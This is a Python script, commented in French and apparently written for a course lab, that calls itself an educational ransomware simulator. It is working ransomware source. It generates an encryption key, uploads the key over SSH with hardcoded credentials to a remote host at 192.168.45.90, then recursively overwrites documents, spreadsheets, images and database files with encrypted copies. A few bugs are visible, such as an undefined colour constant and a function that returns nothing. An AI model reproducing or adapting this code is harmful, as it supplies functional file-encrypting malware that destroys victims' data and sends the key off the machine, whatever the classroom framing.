#!/usr/bin/env python3
# RANSOMWARE SIMULATEUR - TP-03 - CONNEXION SSH
import os
import sys
import time
import logging
from pathlib import Path
from cryptography.fernet import Fernet
import paramiko

# Configuration des couleurs
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

# Configuration du logging
logging.basicConfig(
    level=logging.INFO,
    format=f'{Colors.BLUE}%(asctime)s{Colors.END} - {Colors.YELLOW}%(levelname)s{Colors.END} - %(message)s',
    handlers=[
        logging.FileHandler('/tmp/ransomware_sim.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger()

class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.cipher = None
        self.ssh_client = paramiko.SSHClient()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Configuration SSH
        self.ssh_config = {
            'host': '192.168.45.90',
            'port': 22,
            'username': 'doranco',
            'password': 'doranco',
            'remote_key_dir': '/home/doranco/cle_dechiffrement'
        }
        
        # Extensions cibles
        self.target_exts = {
            '.txt', '.doc', '.docx', '.xls', '.xlsx', 
            '.pdf', '.jpg', '.png', '.sql', '.db'
        }

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def show_banner(self):
        self.clear_screen()
        print(f"""{Colors.RED}
    ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
    ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
    ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
    ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
    {Colors.END}""")
        print(f"{Colors.CYAN}=== SIMULATEUR ÉDUCATIF - TP-03 ==={Colors.END}\n")

    def generate_key(self):
        """Génère une clé de chiffrement"""
        logger.info(f"{Colors.GREEN}Génération de la clé...{Colors.END}")
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        logger.info(f"Clé générée: {Colors.YELLOW}{self.key.decode()[:12]}...{Colors.END}")
        return True

    def transfer_key_ssh(self):
        """Transfère la clé via SSH"""
        if not self.key:
            logger.error(f"{Colors.RED}Aucune clé générée!{Colors.END}")
            return False

        try:
            # Connexion SSH
            self.ssh_client.connect(
                hostname=self.ssh_config['host'],
                port=self.ssh_config['port'],
                username=self.ssh_config['username'],
                password=self.ssh_config['password'],
                timeout=10
            )
            
            # Création répertoire distant
            stdin, stdout, stderr = self.ssh_client.exec_command(
                f"mkdir -p {self.ssh_config['remote_key_dir']}"
            )
            
            # Transfert SFTP
            with self.ssh_client.open_sftp() as sftp:
                remote_path = f"{self.ssh_config['remote_key_dir']}/key_{os.uname().nodename}.key"
                with sftp.file(remote_path, 'wb') as remote_file:
                    remote_file.write(self.key)
            
            logger.info(f"{Colors.GREEN}Clé transférée vers {Colors.CYAN}{self.ssh_config['host']}:{remote_path}{Colors.END}")
            return True
            
        except Exception as e:
            logger.error(f"{Colors.RED}Échec transfert SSH: {str(e)}{Colors.END}")
            return False
        finally:
            self.ssh_client.close()

    def encrypt_file(self, filepath):
        """Chiffre un fichier"""
        try:
            if os.path.getsize(filepath) > 50 * 1024 * 1024:  # 50MB max
                return False

            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            
            logger.debug(f"Fichier chiffré: {filepath}")
            return True
        except Exception as e:
            logger.error(f"Erreur sur {filepath}: {str(e)}")
            return False

    def encrypt_directory(self, path):
        """Chiffre un dossier"""
        if not os.path.exists(path):
            logger.error(f"{Colors.RED}Dossier introuvable: {path}{Colors.END}")
            return

        encrypted = errors = 0
        logger.info(f"{Colors.PURPLE}Chiffrement de {path}...{Colors.END}")
        
        for root, _, files in os.walk(path):
            for file in files:
                filepath = Path(root) / file
                
                if filepath.suffix.lower() not in self.target_exts:
                    continue
                
                if self.encrypt_file(filepath):
                    encrypted += 1
                else:
                    errors += 1
        
        logger.info(f"{Colors.GREEN}Terminé! {encrypted} fichiers chiffrés, {errors} erreurs{Colors.END}")

    def automatic_mode(self):
        """Mode automatique complet"""
        self.show_banner()
        print(f"{Colors.YELLOW}=== MODE AUTOMATIQUE ==={Colors.END}")
        
        steps = [
            ("Génération de la clé", self.generate_key),
            ("Transfert SSH de la clé", self.transfer_key_ssh),
            ("Chiffrement des fichiers", lambda: self.encrypt_directory('/chemin/a/chiffrer'))
        ]
        
        for i, (desc, func) in enumerate(steps, 1):
            print(f"\n{Colors.CYAN}[{i}/{len(steps)}] {desc}...{Colors.END}")
            if not func():
                print(f"{Colors.RED}Échec à l'étape {i}!{Colors.END}")
                return
            time.sleep(1)
        
        print(f"\n{Colors.GREEN}Opération terminée avec succès!{Colors.END}")
        input("\nAppuyez sur Entrée pour continuer...")

    def show_menu(self):
        """Affiche le menu interactif"""
        while True:
            self.show_banner()
            print(f"{Colors.BOLD}MENU PRINCIPAL:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} Générer une clé")
            print(f"{Colors.GREEN}2.{Colors.END} Transférer la clé via SSH")
            print(f"{Colors.GREEN}3.{Colors.END} Chiffrer un dossier")
            print(f"{Colors.GREEN}4.{Colors.END} Mode automatique")
            print(f"{Colors.RED}0.{Colors.END} Quitter")
            
            choice = input("\nVotre choix: ")
            
            if choice == "1":
                self.generate_key()
            elif choice == "2":
                self.transfer_key_ssh()
            elif choice == "3":
                path = input("Chemin du dossier à chiffrer: ")
                self.encrypt_directory(path)
            elif choice == "4":
                self.automatic_mode()
            elif choice == "0":
                print(f"{Colors.YELLOW}Au revoir!{Colors.END}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}Choix invalide!{Colors.END}")
            
            input("\nAppuyez sur Entrée pour continuer...")

if __name__ == '__main__':
    try:
        # Vérification des dépendances
        try:
            import paramiko
        except ImportError:
            print(f"{Colors.RED}Erreur: Le module 'paramiko' est requis.{Colors.END}")
            print("Installez-le avec: pip3 install paramiko")
            sys.exit(1)
            
        sim = RansomwareSimulator()
        sim.show_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Interruption par l'utilisateur{Colors.END}")
        sys.exit(1)
    except Exception as e:
        logger.critical(f"{Colors.RED}ERREUR FATALE: {str(e)}{Colors.END}")
        sys.exit(1)